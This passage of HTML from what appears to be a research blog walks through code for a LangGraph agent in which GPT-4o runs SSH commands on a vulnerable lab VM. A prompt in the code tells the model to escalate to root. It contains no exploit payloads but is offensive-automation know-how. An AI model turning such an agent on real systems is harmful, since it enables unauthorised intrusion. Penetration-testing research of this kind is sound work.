<span class="normal"><a href="#__codelineno-17-25">25</a></span>
<span class="normal"><a href="#__codelineno-17-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24"></a><span class="n">load_dotenv</span><span class="p">()</span>
</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">get_ssh_connection_from_env</span><span class="p">()</span>
</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26"></a><span class="n">get_or_fail</span><span class="p">(</span><span class="s2">&quot;OPENAI_API_KEY&quot;</span><span class="p">)</span> <span class="c1"># langgraph will use this env variable itself</span>
</span></code></pre></div></td></tr></table></div>
<p>Note that we now have a configured SSH connection within <code>conn</code>. When creating the tools for our LLMs, instead of passing the functions (as we did with <code>@tool</code>), we now pass in the instantiated tool-classes which receive the configured SSH connection through their constructor parameters (line 33, we also added a second tool <code>SSHTestCredentialsTool</code> for credential checking):</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: Getting all configuration from the env</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-32">32</a></span>
<span class="normal"><a href="#__codelineno-18-33">33</a></span>
<span class="normal"><a href="#__codelineno-18-34">34</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32"></a><span class="n">llm</span> <span class="o">=</span> <span class="n">ChatOpenAI</span><span class="p">(</span><span class="n">model</span><span class="o">=</span><span class="s2">&quot;gpt-4o&quot;</span><span class="p">,</span> <span class="n">temperature</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-18-33"><a id="__codelineno-18-33" name="__codelineno-18-33"></a><span class="n">tools</span> <span class="o">=</span> <span class="p">[</span><span class="n">SshExecuteTool</span><span class="p">(</span><span class="n">conn</span><span class="p">),</span> <span class="n">SshTestCredentialsTool</span><span class="p">(</span><span class="n">conn</span><span class="p">)]</span>
</span><span id="__span-18-34"><a id="__codelineno-18-34" name="__codelineno-18-34"></a><span class="n">llm_with_tools</span> <span class="o">=</span> <span class="n">llm</span><span class="o">.</span><span class="n">bind_tools</span><span class="p">(</span><span class="n">tools</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>We can also use this when configuring our initial user question template:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: using the configuration for templating</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-76">76</a></span>
<span class="normal"><a href="#__codelineno-19-77">77</a></span>
<span class="normal"><a href="#__codelineno-19-78">78</a></span>
<span class="normal"><a href="#__codelineno-19-79">79</a></span>
<span class="normal"><a href="#__codelineno-19-80">80</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-76"><a id="__codelineno-19-76" name="__codelineno-19-76"></a><span class="n">template</span> <span class="o">=</span> <span class="n">Template</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
</span><span id="__span-19-77"><a id="__codelineno-19-77" name="__codelineno-19-77"></a><span class="s2">You are a low-privilege user $</span><span class="si">{username}</span><span class="s2"> with password $</span><span class="si">{password}</span><span class="s2"> on a linux system and your goal is to become the root user by executing commands on the remote system.</span>
</span><span id="__span-19-78"><a id="__codelineno-19-78" name="__codelineno-19-78"></a>
</span><span id="__span-19-79"><a id="__codelineno-19-79" name="__codelineno-19-79"></a><span class="s2">Do not repeat already tried escalation attacks. You should focus upon enumeration and privilege escalation. If you were able to become root, describe the used method as final message.</span>
</span><span id="__span-19-80"><a id="__codelineno-19-80" name="__codelineno-19-80"></a><span class="s2">&quot;&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">password</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>And that's it.</p>
    
  </div>
</article>
      
        <article class="md-post md-post--excerpt">
  <header class="md-post__header">
    
      <nav class="md-post__authors md-typeset">
        
          <span class="md-author">
            <img src="https://avatars.githubusercontent.com/u/20667?v=4" alt="Andreas Happe">
          </span>
        
      </nav>
    
    <div class="md-post__meta md-meta">
      <ul class="md-meta__list">
        <li class="md-meta__item">
          <time datetime="2024-10-10 00:00:00">October 10, 2024</time></li>
        
          <li class="md-meta__item">
            in
            
              <a href="../../category/initial-journey/" class="md-meta__link">initial-journey</a></li>
        
        
          
          <li class="md-meta__item">
            
              12 min read
            
          </li>
        
      </ul>
      
    </div>
  </header>
  <div class="md-post__content md-typeset">
    <h2 id="first-steps-and-initial-version"><a class="toclink" href="../../2024/10/10/first-steps-and-initial-version/">First Steps and Initial Version</a></h2>
<p>This started when <a href="https://github.com/brandl">Jürgen</a> contacted <a href="https://github.com/andreashappe">Andreas</a> as he needed an automated attacker emulation for one of his defensive projects. Andreas wrote the initial version of <a href="https://hackingbuddy.ai">hackingBuddyGPT</a> in March 2023 (roughly 18 months ago) and much of the codebase was written for older, less-sophisticated, LLMs. Juergen had experience with <a href="https://www.langchain.com/langgraph">LangGraph</a>, so we decided to play around with using langgraph for offensive security.</p>
<h3 id="scencario-and-starting-situation"><a class="toclink" href="../../2024/10/10/first-steps-and-initial-version/#scencario-and-starting-situation">Scencario and Starting Situation</a></h3>
<p>As an initial example we have chosen Linux Privilege Escalation: in these scenarios, you already have access to a linux system (typically over SSH) as a low-privilege user and want to become the all powerful root user.</p>
<p>As a starting point, we were using both <a href="https://langchain-ai.github.io/langgraph/tutorials/introduction/">langgaph's quickstart tutorial</a> for rough guidance, as well as Andreas' original SSH connector to connect to a vulnerable virtual machine provided by <a href="https://github.com/ipa-lab/benchmark-privesc-linux">ipa-lab/benchmark-privesc-linux</a> (also originally written by Andreas).</p>
<p>The following langgraph pages give good background knowledge:</p>
<ul>
<li><a href="https://langchain-ai.github.io/langgraph/">The Langgraph starting page</a></li>
<li><a href="https://langchain-ai.github.io/langgraph/tutorials/introduction/">Langraph QuickStart</a> (part of the tutorial series)</li>
<li>More information about <code>tool usage</code> can also be found <a href="https://python.langchain.com/docs/how_to/custom_tools/#tool-decorator">within the documentation</a></li>
</ul>
<h3 id="the-first-prototype"><a class="toclink" href="../../2024/10/10/first-steps-and-initial-version/#the-first-prototype">The First Prototype</a></h3>
<p>So as a starting point we want to replicate the functonality of <a href="https://hackingbuddy.ai">hackingBuddyGPT</a> in the most simple and abstract way. Think of it like this:</p>
<p><img alt="Concept" src="../../initial_version_conceptual.drawio.png" /></p>
<p>You have a vulnerable VM that allows for the execution of arbitrary commands via SSH. We want to use a LLM (OpenAI GPT4o in this example) to internally think of a strategy and execute commands until our goal of becoming root is reached, in which case we terminate.</p>
<p>This prototype source code can be found <a href="https://github.com/andreashappe/offensivegraphs/tree/64ae8a080c5aa5e7255e1cb00c8ddb5adc6d1a20">in the github history</a>. If you look into the current <code>main</code> branch, the current source code will look differently.</p>
<p>We split the functionality into two files: <code>ssh.py</code> for all the SSH callouts performed by the prototype, and <code>initial_version.py</code> containg the actual prototype logic.</p>
<h4 id="tool-calling-enable-ssh-command-execution"><a class="toclink" href="../../2024/10/10/first-steps-and-initial-version/#tool-calling-enable-ssh-command-execution">Tool-Calling: enable SSH command execution</a></h4>
<p>Tools allow LLMs to access external operations. In our case, we want LLMs to execute commands over SSH on a remote host. Let's go through parts of the code in <code>ssh.py</code>:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">ssh.py: Declare the Tool Function</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-33">33</a></span>
<span class="normal"><a href="#__codelineno-14-34">34</a></span>
<span class="normal"><a href="#__codelineno-14-35">35</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33"></a><span class="nd">@tool</span>
</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34"></a><span class="k">def</span> <span class="nf">ssh_execute_command</span><span class="p">(</span><span class="n">command</span><span class="p">:</span><span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot; Execute command over SSH on the remote machine &quot;&quot;&quot;</span>
</span></code></pre></div></td></tr></table></div>
<p>We initially started by using <a href="https://langchain-ai.github.io/langgraph/how-tos/pass-run-time-values-to-tools/#define-the-tools">langchain's @tool annotation</a> (line 33). This will later allow LLMs to call the <code>ssh_execute_command</code> function. It is important to give a good docstring, as this will be automatically be used to explain the purpose of the tool to the LLM. Parameters and output values will automagically be matched too!</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">ssh.py: Open the SSH connection</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-37">37</a></span>
<span class="normal"><a href="#__codelineno-15-38">38</a></span>
<span class="normal"><a href="#__codelineno-15-39">39</a></span>
<span class="normal"><a href="#__codelineno-15-40">40</a></span>
<span class="normal"><a href="#__codelineno-15-41">41</a></span>
<span class="normal"><a href="#__codelineno-15-42">42</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-37"><a id="__codelineno-15-37" name="__codelineno-15-37"></a>        <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;lowpriv&#39;</span>
</span><span id="__span-15-38"><a id="__codelineno-15-38" name="__codelineno-15-38"></a>        <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;trustno1&#39;</span>
</span><span id="__span-15-39"><a id="__codelineno-15-39" name="__codelineno-15-39"></a>        <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;192.168.121.112&#39;</span>
</span><span id="__span-15-40"><a id="__codelineno-15-40" name="__codelineno-15-40"></a>        <span class="n">hostname</span> <span class="o">=</span> <span class="s1">&#39;test-1&#39;</span>
</span><span id="__span-15-41"><a id="__codelineno-15-41" name="__codelineno-15-41"></a>        <span class="n">conn</span> <span class="o">=</span> <span class="n">SSHConnection</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">hostname</span><span class="o">=</span><span class="n">hostname</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>
</span><span id="__span-15-42"><a id="__codelineno-15-42" name="__codelineno-15-42"></a>        <span class="n">conn</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
</span></code></pre></div></td></tr></table></div>
<p>This is ugly hard-coded cruft. We open a SSH connection to a hard-coded target host. We will make this configurable in the next blog post.</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">ssh.py: Execute a command and return a value</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-44">44</a></span>
<span class="normal"><a href="#__codelineno-16-45">45</a></span>
<span class="normal"><a href="#__codelineno-16-46">46</a></span>
<span class="normal"><a href="#__codelineno-16-47">47</a></span>
<span class="normal"><a href="#__codelineno-16-48">48</a></span>
<span class="normal"><a href="#__codelineno-16-49">49</a></span>
<span class="normal"><a href="#__codelineno-16-50">50</a></span>
<span class="normal"><a href="#__codelineno-16-51">51</a></span>
<span class="normal"><a href="#__codelineno-16-52">52</a></span>
<span class="normal"><a href="#__codelineno-16-53">53</a></span>
<span class="normal"><a href="#__codelineno-16-54">54</a></span>
<span class="normal"><a href="#__codelineno-16-55">55</a></span>
<span class="normal"><a href="#__codelineno-16-56">56</a></span>
<span class="normal"><a href="#__codelineno-16-57">57</a></span>
<span class="normal"><a href="#__codelineno-16-58">58</a></span>
<span class="normal"><a href="#__codelineno-16-59">59</a></span>
<span class="normal"><a href="#__codelineno-16-60">60</a></span>
<span class="normal"><a href="#__codelineno-16-61">61</a></span>
<span class="normal"><a href="#__codelineno-16-62">62</a></span>
<span class="normal"><a href="#__codelineno-16-63">63</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-44"><a id="__codelineno-16-44" name="__codelineno-16-44"></a>        <span class="n">sudo_pass</span> <span class="o">=</span> <span class="n">Responder</span><span class="p">(</span>
</span><span id="__span-16-45"><a id="__codelineno-16-45" name="__codelineno-16-45"></a>            <span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;\[sudo\] password for &quot;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span><span class="p">,</span>
</span><span id="__span-16-46"><a id="__codelineno-16-46" name="__codelineno-16-46"></a>            <span class="n">response</span><span class="o">=</span><span class="n">password</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span id="__span-16-47"><a id="__codelineno-16-47" name="__codelineno-16-47"></a>        <span class="p">)</span>
</span><span id="__span-16-48"><a id="__codelineno-16-48" name="__codelineno-16-48"></a>
</span><span id="__span-16-49"><a id="__codelineno-16-49" name="__codelineno-16-49"></a>        <span class="n">out</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">()</span>
</span><span id="__span-16-50"><a id="__codelineno-16-50" name="__codelineno-16-50"></a>        <span class="k">try</span><span class="p">:</span>
</span><span id="__span-16-51"><a id="__codelineno-16-51" name="__codelineno-16-51"></a>            <span class="n">conn</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">pty</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">warn</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">out_stream</span><span class="o">=</span><span class="n">out</span><span class="p">,</span> <span class="n">watchers</span><span class="o">=</span><span class="p">[</span><span class="n">sudo_pass</span><span class="p">],</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
</span><span id="__span-16-52"><a id="__codelineno-16-52" name="__codelineno-16-52"></a>        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span><span id="__span-16-53"><a id="__codelineno-16-53" name="__codelineno-16-53"></a>            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;TIMEOUT! Could we have become root?&quot;</span><span class="p">)</span>
</span><span id="__span-16-54"><a id="__codelineno-16-54" name="__codelineno-16-54"></a>        <span class="n">out</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-16-55"><a id="__codelineno-16-55" name="__codelineno-16-55"></a>        <span class="n">tmp</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span id="__span-16-56"><a id="__codelineno-16-56" name="__codelineno-16-56"></a>        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">out</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
</span><span id="__span-16-57"><a id="__codelineno-16-57" name="__codelineno-16-57"></a>            <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;[sudo] password for &quot;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span><span class="p">):</span>
</span><span id="__span-16-58"><a id="__codelineno-16-58" name="__codelineno-16-58"></a>                <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
</span><span id="__span-16-59"><a id="__codelineno-16-59" name="__codelineno-16-59"></a>                <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span> <span class="o">+</span> <span class="n">line</span>
</span><span id="__span-16-60"><a id="__codelineno-16-60" name="__codelineno-16-60"></a>
</span><span id="__span-16-61"><a id="__codelineno-16-61" name="__codelineno-16-61"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;cmd executed:&quot;</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
</span><span id="__span-16-62"><a id="__codelineno-16-62" name="__codelineno-16-62"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;result: &quot;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">)</span>
</span><span id="__span-16-63"><a id="__codelineno-16-63" name="__codelineno-16-63"></a>        <span class="k">return</span> <span class="n">tmp</span>
</span></code></pre></div></td></tr></table></div>
<p>This is the actual code that executes a SSH command and captures it's output. This is also old cruft and hopefully looks better in the current version within the repository.</p>
<p>The import thing to note is line 63: here we return the output of the executed command as string from the fuction. LangChain will take this output and return it to the LLM as result of the tool call.</p>
<h4 id="the-privilege-escalation-prototype"><a class="toclink" href="../../2024/10/10/first-steps-and-initial-version/#the-privilege-escalation-prototype">The Privilege Escalation Prototype</a></h4>
<p>Let's go the 'meat' of the code, the langgraph agent in <code>initial_version.py</code>:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: Setup</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-16">16</a></span>
<span class="normal"><a href="#__codelineno-17-17">17</a></span>
<span class="normal"><a href="#__codelineno-17-18">18</a></span>
<span class="normal"><a href="#__codelineno-17-19">19</a></span>
<span class="normal"><a href="#__codelineno-17-20">20</a></span>
<span class="normal"><a href="#__codelineno-17-21">21</a></span>
<span class="normal"><a href="#__codelineno-17-22">22</a></span>
<span class="normal"><a href="#__codelineno-17-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16"></a><span class="c1"># Load environment variables</span>
</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17"></a><span class="n">load_dotenv</span><span class="p">()</span>
</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18"></a>
</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19"></a><span class="k">def</span> <span class="nf">_set_env</span><span class="p">(</span><span class="n">var</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20"></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">var</span><span class="p">):</span>
</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21"></a>        <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="n">var</span><span class="p">]</span> <span class="o">=</span> <span class="n">getpass</span><span class="o">.</span><span class="n">getpass</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">var</span><span class="si">}</span><span class="s2">: &quot;</span><span class="p">)</span>
</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22"></a>
</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23"></a><span class="n">_set_env</span><span class="p">(</span><span class="s2">&quot;OPENAI_API_KEY&quot;</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>Lots of stuff going on here in the background. We're using <a href="https://pypi.org/project/python-dotenv/">python-dotenv</a> through calling <code>load_dotenv</code>. This looks for a <code>.env</code> file in the curent working directory and load environmental variables from it (if they are not already configured within the environment). Variables like these are typically used to pass API-keys and similar to programs.</p>
<p>The one environmental variable in use is <code>OPENAI_API_KEY</code> which is used to connect to OpenAI. Lines 19-23 were copied from the quickstart. They check if the environable variable is set and ask the user for it otherwise. This variable itself will be used by langchain and langgraph itself, so we do not have to do anything with it explicitely.</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: Connect to the LLM and setup Tools</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-26">26</a></span>
<span class="normal"><a href="#__codelineno-18-27">27</a></span>
<span class="normal"><a href="#__codelineno-18-28">28</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26"></a><span class="n">llm</span> <span class="o">=</span> <span class="n">ChatOpenAI</span><span class="p">(</span><span class="n">model</span><span class="o">=</span><span class="s2">&quot;gpt-4o&quot;</span><span class="p">,</span> <span class="n">temperature</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27"></a><span class="n">tools</span> <span class="o">=</span> <span class="p">[</span><span class="n">ssh_execute_command</span><span class="p">]</span>
</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28"></a><span class="n">llm_with_tools</span> <span class="o">=</span> <span class="n">llm</span><span class="o">.</span><span class="n">bind_tools</span><span class="p">(</span><span class="n">tools</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>Now we create a connection to the LLM (<code>gpt-4o</code> in our case) and register some tools that the LLM is allowed to use. As tool, we are using the <code>ssh_execute_command</code> function we described before.</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: Begin with our Graph</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-31">31</a></span>
<span class="normal"><a href="#__codelineno-19-32">32</a></span>
<span class="normal"><a href="#__codelineno-19-33">33</a></span>
<span class="normal"><a href="#__codelineno-19-34">34</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-31"><a id="__codelineno-19-31" name="__codelineno-19-31"></a><span class="k">class</span> <span class="nc">State</span><span class="p">(</span><span class="n">TypedDict</span><span class="p">):</span>
</span><span id="__span-19-32"><a id="__codelineno-19-32" name="__codelineno-19-32"></a>    <span class="n">messages</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="nb">list</span><span class="p">,</span> <span class="n">add_messages</span><span class="p">]</span>
</span><span id="__span-19-33"><a id="__codelineno-19-33" name="__codelineno-19-33"></a>
</span><span id="__span-19-34"><a id="__codelineno-19-34" name="__codelineno-19-34"></a><span class="n">graph_builder</span> <span class="o">=</span> <span class="n">StateGraph</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>Now it gets interessting: we start with defining our langgraph graph. Within langgraph, you are using <code>Nodes</code> and <code>Edges</code>. The nodes in your graph are the "action points". Those are the locations, where you perform operations or ask a LLM to decide or perform stuff for you. Within the python code, each node will be implemented as a python function (see below). Edges define, which nodes are allowed to pass on information to other nodes.</p>
<p>The information passed between nodes is stored in the <code>State</code>. In our case, we just use a list of <code>messages</code>. <code>Annotated</code> is from python's <code>typing</code> library and allows us to add some metadata to the <code>messages</code> variable. In this case, we store the method <code>add_messages</code> as meta-data. Langgraph will know through this, that if new messages are added, it will call <code>add_messages</code> to add the messages to the list. In our case, we just have a growing list, but you could implement a sliding window or some sort of compaction/compression mechnism through this.</p>
<p>Finally, we create our graph (named <code>graph_builder</code>). We tell it that <code>State</code> will be used to pass messages.</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: Our first node, the LLM call</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-38">38</a></span>
<span class="normal"><a href="#__codelineno-20-39">39</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-38"><a id="__codelineno-20-38" name="__codelineno-20-38"></a><span class="k">def</span> <span class="nf">chatbot</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">State</span><span class="p">):</span>
</span><span id="__span-20-39"><a id="__codelineno-20-39" name="__codelineno-20-39"></a>    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;messages&quot;</span><span class="p">:</span> <span class="p">[</span><span class="n">llm_with_tools</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">state</span><span class="p">[</span><span class="s2">&quot;messages&quot;</span><span class="p">])]}</span>
</span></code></pre></div></td></tr></table></div>
<p>Within those two lines, a lot happens! We define our first graph node (called <code>chatbot</code> as this was copied out of the tutorial). What is it doing? It takes all messages that are stored within the state (<code>state["messages"]</code>) and calls out to the LLM. As the first message in the list (as you will see below) is the task that the LLM should achieve, this will give the LLM the task as well as a history about all other actions that already have been taken.</p>
<p>The output of the LLM (typically a <code>str</code>) will be put into an array (and in turn put into a map), thus the output of the node will be, e.g., <code>{ "messages" : [ "the LLM output" ]}</code>. As configured above, the <code>add_messages</code> method will be used to append this to <code>state['messages']</code>.</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: Let's build our graph</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-56">56</a></span>
<span class="normal"><a href="#__codelineno-21-57">57</a></span>
<span class="normal"><a href="#__codelineno-21-58">58</a></span>
<span class="normal"><a href="#__codelineno-21-59">59</a></span>
<span class="normal"><a href="#__codelineno-21-60">60</a></span>
<span class="normal"><a href="#__codelineno-21-61">61</a></span>
<span class="normal"><a href="#__codelineno-21-62">62</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-56"><a id="__codelineno-21-56" name="__codelineno-21-56"></a><span class="n">graph_builder</span><span class="o">.</span><span class="n">add_node</span><span class="p">(</span><span class="s2">&quot;chatbot&quot;</span><span class="p">,</span> <span class="n">chatbot</span><span class="p">)</span>
</span><span id="__span-21-57"><a id="__codelineno-21-57" name="__codelineno-21-57"></a><span class="n">graph_builder</span><span class="o">.</span><span class="n">add_node</span><span class="p">(</span><span class="s2">&quot;tools&quot;</span><span class="p">,</span> <span class="n">ToolNode</span><span class="p">(</span><span class="n">tools</span><span class="o">=</span><span class="n">tools</span><span class="p">))</span>
</span><span id="__span-21-58"><a id="__codelineno-21-58" name="__codelineno-21-58"></a>
</span><span id="__span-21-59"><a id="__codelineno-21-59" name="__codelineno-21-59"></a><span class="n">graph_builder</span><span class="o">.</span><span class="n">add_edge</span><span class="p">(</span><span class="n">START</span><span class="p">,</span> <span class="s2">&quot;chatbot&quot;</span><span class="p">)</span>
</span><span id="__span-21-60"><a id="__codelineno-21-60" name="__codelineno-21-60"></a><span class="n">graph_builder</span><span class="o">.</span><span class="n">add_conditional_edges</span><span class="p">(</span><span class="s2">&quot;chatbot&quot;</span><span class="p">,</span> <span class="n">route_tools</span><span class="p">)</span>
</span><span id="__span-21-61"><a id="__codelineno-21-61" name="__codelineno-21-61"></a><span class="n">graph_builder</span><span class="o">.</span><span class="n">add_edge</span><span class="p">(</span><span class="s2">&quot;tools&quot;</span><span class="p">,</span> <span class="s2">&quot;chatbot&quot;</span><span class="p">)</span>
</span><span id="__span-21-62"><a id="__codelineno-21-62" name="__codelineno-21-62"></a><span class="n">graph_builder</span><span class="o">.</span><span class="n">add_edge</span><span class="p">(</span><span class="s2">&quot;chatbot&quot;</span><span class="p">,</span> <span class="n">END</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>Let's start with finally creating our graph. We add our LLM-calling node (<code>chatbot</code>) and then add a predefined <code>ToolNode</code>. This is a node that will receive messages about calling tools, e.g., allowing the LLM to interact with the world. To let it know which tools are supported, we pass the same <code>tools</code> into it as we registered with the LLM (makes sense, both should know the same tool calls or would get out-of-sync).</p>
<p>Then we start to create the edges between our nodes. There are special <code>START</code> and <code>END</code> nodes that denote the graphs starting and ending points (d'oh, lines 59 and 62). We connect the chatbot to the tool node on line 60, and connect back the tool node to the chatbot on line 61. So the LLM bot might create a message for the user (the result to the incoming question) or might create a tool-call message. The Tool node would take the tool-call message and interact with the external world and then pass back the result to the LLM node.</p>
<p>This creates an infinite loop and we cannot have that, can we? This is why on line 60 we define a condition edge: this is an edge with a condition that can dynamically select the next action (node) to perform. To do this, we define the <code>route_tools</code> method:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: either call a tool, or quit</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-41">41</a></span>
<span class="normal"><a href="#__codelineno-22-42">42</a></span>
<span class="normal"><a href="#__codelineno-22-43">43</a></span>
<span class="normal"><a href="#__codelineno-22-44">44</a></span>
<span class="normal"><a href="#__codelineno-22-45">45</a></span>
<span class="normal"><a href="#__codelineno-22-46">46</a></span>
<span class="normal"><a href="#__codelineno-22-47">47</a></span>
<span class="normal"><a href="#__codelineno-22-48">48</a></span>
<span class="normal"><a href="#__codelineno-22-49">49</a></span>
<span class="normal"><a href="#__codelineno-22-50">50</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-41"><a id="__codelineno-22-41" name="__codelineno-22-41"></a><span class="k">def</span> <span class="nf">route_tools</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">State</span><span class="p">):</span>
</span><span id="__span-22-42"><a id="__codelineno-22-42" name="__codelineno-22-42"></a>    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="nb">list</span><span class="p">):</span>
